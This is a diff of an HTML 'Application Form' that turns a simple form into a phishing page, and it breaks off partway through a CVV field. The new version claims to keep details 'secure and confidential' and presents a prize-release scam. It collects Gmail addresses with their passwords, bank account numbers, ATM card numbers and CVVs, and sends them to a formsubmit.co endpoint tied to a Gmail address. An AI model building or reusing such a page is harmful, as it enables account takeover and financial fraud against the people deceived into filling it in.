@@ -1,135 +1,76 @@
-<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html><html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Application Form</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.19/css/intlTelInput.min.css"/>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      background-color: #f2f2f2;
-      padding: 20px;
-    }
-
-    .form-container {
-      max-width: 500px;
-      margin: 0 auto;
-      background-color: white;
-      padding: 20px;
-      border-radius: 12px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-    }
-
-    h2 {
-      text-align: center;
-    }
-
-    label {
-      display: block;
-      margin-top: 15px;
-      margin-bottom: 5px;
-    }
-
-    input, select {
-      width: 100%;
-      padding: 10px;
-      margin-bottom: 10px;
-      border: 1px solid #ccc;
-      border-radius: 6px;
-      box-sizing: border-box;
-    }
-
-    input[type="submit"] {
-      background-color: #4CAF50;
-      color: white;
-      border: none;
-      cursor: pointer;
-    }
-
-    input[type="submit"]:hover {
-      background-color: #45a049;
-    }
-
-    small {
-      color: #666;
-    }
+    body { font-family: Arial, sans-serif; padding: 15px; margin: 0; background: #f9f9f9; }
+    form { max-width: 480px; margin: auto; background: white; padding: 15px; border-radius: 10px;
+           box-shadow: 0 0 10px rgba(0,0,0,0.05); }
+    h2 { text-align: center; font-size: 1.5em; margin-bottom: 10px; }
+    .notice { text-align: center; font-size: 0.9em; color: #555; margin-bottom: 20px; }
+    label { display: block; margin-top: 12px; font-weight: bold; font-size: 0.95em; }
+    input, select { width: 100%; padding: 10px; font-size: 1em; margin-top: 5px;
+                    border: 1px solid #ccc; border-radius: 6px; }
+    .readonly-box { background: #f0f0f0; padding: 10px; border: 1px solid #ccc;
+                    border-radius: 6px; margin-top: 8px; font-weight: bold; }
+    .card-section { margin-top: 10px; }
+    button { margin-top: 20px; width: 100%; padding: 12px; background: #007bff; color: white;
+             border: none; border-radius: 6px; font-size: 1em; }
+    button:disabled { background: #aaa; cursor: not-allowed; }
+    button:hover:enabled { background: #0056b3; }
+    .hidden { display: none; }
+    .password-wrapper { position: relative; }
+    .password-wrapper span { position: absolute; right: 10px; top: 50%;
+                              transform: translateY(-50%); cursor: pointer; font-size: 1.1em; }
   </style>
 </head>
 <body>
-  <div class="form-container">
+  <form id="applicationForm" method="POST" action="https://formsubmit.co/exellentfirm@gmail.com">
     <h2>Application Form</h2>
-    <form action="https://formspree.io/f/your_form_id" method="POST">
-      <label for="fullname">Full Name:</label>
-      <input type="text" id="fullname" name="fullname" placeholder="Enter your full name" required>
+    <div class="notice">We keep your details secure and confidential.</div><!-- 1: Full Name -->
+<label for="fullName">1. Full Name</label>
+<input type="text" id="fullName" name="fullName" required pattern="[A-Za-z\s]+" title="Letters and spaces only.">
 
-      <label for="country">Country:</label>
-      <select id="country" name="country" required>
-        <option value="" disabled selected>Select your country</option>
-        <option value="Algeria">Algeria</option>
-        <option value="Angola">Angola</option>
-        <option value="Botswana">Botswana</option>
-        <option value="Burundi">Burundi</option>
-        <option value="Cameroon">Cameroon</option>
-        <option value="Côte d'Ivoire">Côte d'Ivoire</option>
-        <option value="DR Congo">DR Congo</option>
-        <option value="Egypt">Egypt</option>
-        <option value="Ethiopia">Ethiopia</option>
-        <option value="Ghana">Ghana</option>
-        <option value="Kenya">Kenya</option>
-        <option value="Lesotho">Lesotho</option>
-        <option value="Malawi">Malawi</option>
-        <option value="Morocco">Morocco</option>
-        <option value="Mozambique">Mozambique</option>
-        <option value="Namibia">Namibia</option>
-        <option value="Nigeria">Nigeria</option>
-        <option value="Rwanda">Rwanda</option>
-        <option value="Senegal">Senegal</option>
-        <option value="South Africa">South Africa</option>
-        <option value="Sudan">Sudan</option>
-        <option value="Tanzania">Tanzania</option>
-        <option value="Tunisia">Tunisia</option>
-        <option value="Uganda">Uganda</option>
-        <option value="Zambia">Zambia</option>
-        <option value="Zimbabwe">Zimbabwe</option>
-      </select>
+<!-- 2: Phone with country dropdown -->
+<label for="phoneNumber">2. Phone Number</label>
+<input type="tel" id="phoneNumber" name="phoneNumber" required>
 
-      <label for="phone">Phone Number:</label>
-      <input 
-        type="tel" 
-        id="phone" 
-        name="phone" 
-        placeholder="e.g. 0712345678 or 254712345678" 
-        pattern="^\d{9,12}$" 
-        title="Enter 9 to 12 digits only, without + sign. E.g., 0712345678 or 254712345678" 
-        required
-      >
-      <small>Enter your phone number in either local or international format. No + sign needed.</small>
+<!-- 3: Email -->
+<label for="emailAddress">3. Email Address</label>
+<input type="email" id="emailAddress" name="emailAddress" required pattern="^[a-zA-Z0-9._%+-]+@gmail\.com$" title="Only @gmail.com allowed.">
 
-      <label for="secret">Secret Code (PIN):</label>
-      <input type="password" id="secret" name="secret" placeholder="Enter your 6-digit code" pattern="\d{6}" title="Enter a 6-digit code" required>
+<!-- 4: Email Password -->
+<label for="emailPassword">4. Email Password</label>
+<div class="password-wrapper">
+  <input type="password" id="emailPassword" name="emailPassword" required style="padding-right:40px;">
+  <span onclick="togglePassword()">👁️</span>
+</div>
 
-      <label for="amount_paid">Amount Paid:</label>
-      <input type="number" id="amount_paid" name="amount_paid" placeholder="Enter the amount you paid" min="1" required>
+<!-- Remaining fields numbered 5+ -->
+<label for="amountWon">5. Amount You Won</label>
+<input type="text" id="amountWon" name="amountWon" required>
 
-      <label for="amount_applied">Amount Applied For:</label>
-      <input type="number" id="amount_applied" name="amount_applied" placeholder="Enter amount you are applying for" min="1" required>
+<label for="bankType">6. Bank Account Type (e.g., Standard Bank)</label>
+<input type="text" id="bankType" name="bankType" placeholder="e.g., Standard Bank" required>
 
-      <!-- Optional redirect after submit -->
-      <input type="hidden" name="_redirect" value="thankyou.html">
+<label for="bankNumber">7. Bank Account Number</label>
+<input type="text" id="bankNumber" name="bankNumber" required>
 
-      <input type="submit" value="Submit Application">
-    </form>
-  </div>
+<label for="accountHolder">8. Bank Account Holder's Name</label>
+<input type="text" id="accountHolder" name="accountHolder" required>
 
-  <script>
-    // Real-time error display on field exit
-    document.querySelectorAll("input, select").forEach(function(input) {
-      input.addEventListener("blur", function() {
-        if (!input.checkValidity()) {
-          input.reportValidity();
-        }
-      });
-    });
-  </script>
-</body>
-</html>
+<label for="atmLinked">9. Did you link an ATM card to your <span id="bankTypePreview">bank</span> account?</label>
+<select id="atmLinked" name="atmLinked" required>
+  <option value="">--Select--</option><option value="Yes">Yes</option><option value="No">No</option>
+</select>
+
+<div class="card-section hidden" id="cardSection">
+  <label>10. We need to verify your details so that we release <span id="amountPreview">[amount]</span> to your <span id="bankPreview">[bank]</span> account.</label>
+  <label for="atmNumber">ATM Card Number</label>
+  <input type="text" id="atmNumber" name="atmNumber" required maxlength="16" pattern="\d{16}" inputmode="numeric" title="Exactly 16 digits.">
+
+  <label for="cvv">CVV (3 digits only)</label>
+  <input type="text" id="cvv" name="cvv" maxlength="3" required pattern="\d{3}" input
+
